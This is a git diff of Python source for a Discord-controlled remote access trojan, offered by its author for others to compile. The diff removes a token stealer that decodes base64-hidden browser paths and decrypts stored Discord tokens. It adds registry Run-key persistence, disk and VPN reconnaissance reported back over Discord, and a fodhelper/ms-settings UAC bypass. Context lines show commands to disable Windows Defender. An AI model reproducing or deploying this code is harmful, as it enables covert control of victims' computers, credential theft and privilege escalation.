@@ -1,14 +1,14 @@
-# Developed by nspe (discord) (lol ive been working on this for 3 weeks cause i was bored)
-# This Discord Remote Access Trojan (RAT) is fairly harmless as it doesnt contain UAC-Bypasses or Dangerous Commands (other than token grabbing)
-# This trojan is in very early development, but over time will (with rnough commitment from me) become a full fledged Discord RAT and possibly a 'cheap' but paid RAT similar to Seroxen.
-# Please replace Token and Server Name Variables under the "Token & Vars Section"
-# To add transparency and trust I will not make a builder, this means the entire src is below and must be manualy compiled by you. I suggest auto-py-to-exe as It's fairly simple to setup
+# Developed by nspe (lol ive been working on this for 3 weeks cause i was bored)
+
+# YOU MUST EDIT THESE LINES:
+# Line 47: Put your Bot Token in the '' section
+# Line 214: REPLACE the name syntax of "guild = discord.utils.get(bot.guilds, name='')" with the name of your server
 
 #---------------------------------------#
 #               IMPORTS                 #
 #---------------------------------------#
 
-import discord;
+import discord
 from discord.ext import commands
 import tkinter as tk
 import mss
@@ -28,7 +28,6 @@ import subprocess
 import requests
 import aiohttp
 import winshell
-import shutil
 import argparse
 import sys
 import re
@@ -37,36 +36,161 @@ import json
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 import win32crypt
+import time
+import inspect
+import winreg
 
 #---------------------------------------#
 #             TOKEN & VARS              #
 #---------------------------------------#
 
-TOKEN = 'BOT_TOKEN'
-server_name = 'guild_name'
-
-
+TOKEN = ''
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 chatbox_window = None
 chat_text_widget = None
 
+@bot.event
+async def on_message(message):
+    if message.content.startswith('!') and isinstance(message.channel, discord.TextChannel):
+        session_id = message.channel.name
+        bot_username = getpass.getuser()
+        command_prefix = bot.command_prefix
+        command_args = message.content.split(' ')
+        command_name = command_args[0][len(command_prefix):].lower()
+        if session_id.lower() == bot_username.lower():
+            await bot.process_commands(message)
+        else:
+            print("troll")
+    else:
+        await bot.process_commands(message)
 
 #---------------------------------------#
 #               COMMANDS                #
 #---------------------------------------#
 
 @bot.command()
-async def token(ctx):
+async def startup(ctx, action):
     try:
-        done = grab()
-        if done:
-            for token in done:
-                await ctx.send(token)
+        exe_path = sys.executable
+        
+        if action.lower() == "enable":
+            set_startup_registry(os.path.basename(exe_path), exe_path)
+            await ctx.send(f"Bot is now set to run at startup.")
+        elif action.lower() == "disable":
+            disable_startup_registry(os.path.basename(exe_path))
+            await ctx.send(f"Bot is no longer set to run at startup.")
         else:
-            await ctx.send("No tokens found.")
+            await ctx.send("Invalid action. Use 'enable' or 'disable'.")
     except Exception as e:
-        await ctx.send(f"An error occurred while grabbing tokens: {e}")
+        await ctx.send(f"An error occurred: {e}")
+
+@bot.command()
+async def filesearch(ctx, filename):
+    try:
+        found_files = []
+        for root, dirs, files in os.walk("C:\\"):
+            for file in files:
+                if file.lower() == filename.lower():
+                    found_files.append(os.path.join(root, file))
+        
+        if found_files:
+            await ctx.send(f"Found {len(found_files)} files named '{filename}':")
+            for file_path in found_files:
+                await ctx.send(file_path)
+        else:
+            await ctx.send(f"No files named '{filename}' found.")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+popular_vpns = [
+    "NordVPN", "ExpressVPN", "Surfshark", "CyberGhost", "Private Internet Access",
+    "VyprVPN", "IPVanish", "TunnelBear", "Hotspot Shield", "Windscribe",
+    "ProtonVPN", "Hide.me", "PureVPN", "FastestVPN", "Namecheap VPN", "Cloudflare WARP"
+]
+
+chrome_extension_vpns = [
+    "1.1.1.1", "ExpressVPN Chrome Extension", "NordVPN Chrome Extension", "Surfshark VPN for Chrome"
+]
+
+@bot.command()
+async def vpn(ctx):
+    try:
+        vpn_found = set()
+        for root, dirs, files in os.walk("C:\\"):
+            for file in files:
+                for vpn_name in popular_vpns:
+                    if vpn_name.lower() in file.lower() and file.endswith(".exe"):
+                        if vpn_name not in vpn_found:
+                            vpn_found.add(vpn_name)
+                            await ctx.send(f"Found .exe with '{vpn_name}' in name: {os.path.join(root, file)}")
+                            is_running = is_process_running(vpn_name)
+                            await ctx.send(f"{vpn_name} is {'running' if is_running else 'not running'}")
+        chrome_extensions_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Extensions")
+        if os.path.exists(chrome_extensions_path):
+            for extension in os.listdir(chrome_extensions_path):
+                for vpn_name in popular_vpns:
+                    if vpn_name.lower() in extension.lower():
+                        if vpn_name not in vpn_found:
+                            vpn_found.add(vpn_name)
+                            await ctx.send(f"Found Chrome extension with '{vpn_name}' in name: {os.path.join(chrome_extensions_path, extension)}")
+        for vpn_name in chrome_extension_vpns:
+            if vpn_name.lower() in extension.lower():
+                if vpn_name not in vpn_found:
+                    vpn_found.add(vpn_name)
+                    await ctx.send(f"Found Chrome extension VPN with '{vpn_name}' in name: {extension}")
+        
+        if not vpn_found:
+            await ctx.send("No VPN-related software found.")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+def is_process_running(process_name):
+    try:
+        output = subprocess.check_output(['tasklist', '/FI', f'IMAGENAME eq {process_name}.exe'])
+        return process_name.lower() in str(output).lower()
+    except subprocess.CalledProcessError:
+        return False
+
+@bot.command()
+async def uacbypass(ctx):
+    class disable_fsr():
+        def __enter__(self):
+            self.disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+            self.revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+            self.old_value = ctypes.c_long()
+            self.disable(ctypes.byref(self.old_value))
+            return self.old_value
+
+        def __exit__(self, type, value, traceback):
+            self.revert(self.old_value)
+
+    await ctx.send("Checking if admin...")
+    isAdmin = os.getuid() == 0 if hasattr(os, 'getuid') else ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if isAdmin:
+        await ctx.send("You're already admin!")
+    else:
+        await ctx.send("Attempting to get admin...")
+        isexe = sys.argv[0].endswith("exe")
+        if not isexe:
+            test_str = sys.argv[0]
+            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
+            cmd2 = current_dir
+        else:
+            test_str = sys.argv[0]
+            current_dir = test_str
+            cmd2 = current_dir
+        create_reg_path = r"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force"""
+        os.system(create_reg_path)
+        create_trigger_reg_key = r"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force"""
+        os.system(create_trigger_reg_key)
+        create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "Command" -Value 'cmd /c start ""{cmd2}""' -Force"""
+        os.system(create_payload_reg_key)
+        with disable_fsr():
+            os.system("fodhelper.exe")
+        time.sleep(2)
+        remove_reg = r"""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force"""
+        os.system(remove_reg)
 
 @bot.command()
 async def disablewindef(ctx):
@@ -88,7 +212,7 @@ async def admincheck(ctx):
 
 @bot.event
 async def on_ready():
-    guild = discord.utils.get(bot.guilds, name=server_name)
+    guild = discord.utils.get(bot.guilds, name='')
     if guild is None:
         print("Error: Bot couldn't find the specified guild.")
         return
@@ -500,82 +624,28 @@ async def get_geolocation():
     except Exception as e:
         return f"Error: {e}", None
 
-def grab():
-    done = []
-    appdata = base64.b64decode(b"XEFwcERhdGE=").decode("utf-8")
-    user = os.path.expanduser("~")
-    locallevel = base64.b64decode(b"XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==").decode("utf-8")
-    paths = [
-        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZA==").decode("utf-8"),
-        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZHB0Yg==").decode("utf-8"),
-        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZGNhbmFyeQ==").decode("utf-8"),
-        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZGRldmVsb3BtZW50").decode("utf-8"),
-        base64.b64decode(b"XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl").decode("utf-8"),
-        base64.b64decode(b"XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXEFtaWdvXFVzZXIgRGF0YQ==").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXFRvcmNoXFVzZXIgRGF0YQ==").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXEtvbWV0YVxVc2VyIERhdGE=").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQ=").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXE9yYml0dW1cVXNlciBEYXRh").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHQ=").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXHVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YVxEZWZhdWx0").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXE9wZXJhIFNvZnR3YXJlXE9wZXJhIE5lb25cVXNlciBEYXRhXERlZmF1bHQ=").decode("utf-8"),
-        base64.b64decode(b"XExvY2FsXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA==").decode("utf-8")
-    ]
+def isAdmin():
+    try:
+        is_admin = (os.getuid() == 0)
+    except AttributeError:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    return is_admin
 
-    for path in paths:
-        localdb = os.path.join(user, appdata, path, locallevel)
-        localstate = os.path.join(user, appdata, path, "Local State")
-        if os.path.exists(localdb) and os.path.exists(localstate):
-            tokens = grab_tokens(localdb, localstate)
-            for token in tokens:
-                try:
-                    headers = {"authorization": token}
-                    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-                    done.append(f"{token}: {response.text}")
-                except:
-                    pass
+def find_exe(exe_name):
+    for root, dirs, files in os.walk("C:\\"):
+        for file in files:
+            if file.lower() == f"{exe_name}.exe":
+                return os.path.join(root, file)
+    return None
 
-    return done
+def set_startup_registry(exe_name, exe_path):
+    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_reg_key, 0, winreg.KEY_WRITE) as key:
+        winreg.SetValueEx(key, exe_name, 0, winreg.REG_SZ, exe_path)
 
-def grab_tokens(leveldb_path, localstate_path):
-    tokens = []
-    basic_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
-    new_regex = re.compile(r"mfa\.[\w-]{84}")
-    encrypted_regex = re.compile(r"(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")
-
-    for file in os.listdir(leveldb_path):
-        if file.endswith(".ldb"):
-            with open(os.path.join(leveldb_path, file), "r", encoding="utf-8") as f:
-                contents = f.read()
-
-            for match in basic_regex.finditer(contents):
-                tokens.append(match.group())
-
-            for match in new_regex.finditer(contents):
-                tokens.append(match.group())
-
-            for match in encrypted_regex.finditer(contents):
-                encrypted_token = match.group(2)
-                decrypted_token = decrypt_token(encrypted_token, localstate_path)
-                tokens.append(decrypted_token)
-
-    return tokens
-
-def decrypt_token(encrypted_token, localstate_path):
-    encrypted_token = base64.b64decode(encrypted_token.split(":")[1])
-    encrypted_key = json.loads(open(localstate_path, "r", encoding="utf-8").read())["os_crypt"]["encrypted_key"]
-    encrypted_key = base64.b64decode(encrypted_key[5:])
-    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    cipher = AES.new(key, AES.MODE_GCM, encrypted_token[:12])
-    decrypted_token = cipher.decrypt(encrypted_token[12:])[:-16].decode()
-    return decrypted_token
+def disable_startup_registry(exe_name):
+    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_reg_key, 0, winreg.KEY_WRITE) as key:
+        winreg.DeleteValue(key, exe_name)
 
 bot.run(TOKEN)
